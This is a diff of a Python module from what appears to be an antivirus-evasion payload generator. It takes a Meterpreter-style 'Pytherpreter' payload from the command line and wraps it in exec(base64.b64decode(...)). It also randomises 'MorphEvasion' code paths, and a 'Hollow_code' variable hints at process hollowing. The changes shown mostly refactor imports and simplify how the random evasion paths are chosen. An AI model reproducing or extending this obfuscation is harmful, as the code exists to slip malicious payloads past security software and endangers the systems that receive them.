@@ -18,13 +18,14 @@
      #                                                                                      #
      ########################################################################################
  
-import random
-import random, string
+
 import sys
-from random import shuffle
+import string
+from random import randint
 sys.path.append("Modules/payloads/auxiliar")
-import usefull
-import base64
+from usefull import python_poly_multipath
+from usefull import varname_creator
+from base64 import b64encode
 
 
 Pytherpreter = sys.argv[1]
@@ -32,26 +33,14 @@ Filename = sys.argv[2]
 wine = sys.argv[3]
 
 Pytherpreter.replace("import base64,sys;exec","")
-Pytherpreter= "exec(base64.b64decode(\"" + base64.b64encode(Pytherpreter) + "\"))\n"
+Pytherpreter= "exec(base64.b64decode(\"" + b64encode(Pytherpreter) + "\"))\n"
 
-Randptr = usefull.varname_creator()
-Randbytesnumb = str(random.randint(1000,9999))
-x=[[i] for i in range(1,4)]
+Randptr = varname_creator()
+Randbytesnumb = str(randint(1000,9999))
 
-shuffle(x)
-a=str(x[0])
-b=str(x[1])
-c=str(x[2])
-a=a.replace("[","")
-a=a.replace("]","")
-b=b.replace("[","")
-b=b.replace("]","")
-c=c.replace("[","")
-c=c.replace("]","")
-
-MorphEvasion1 = str(usefull.python_poly_multipath(a,"1"))
-MorphEvasion2 = str(usefull.python_poly_multipath(b,"2"))
-MorphEvasion3 = str(usefull.python_poly_multipath(c,"3"))
+MorphEvasion1 = python_poly_multipath(randint(1,3),1)
+MorphEvasion2 = python_poly_multipath(randint(1,3),2)
+MorphEvasion3 = python_poly_multipath(randint(1,3),3)
 
 Hollow_code = ""
 
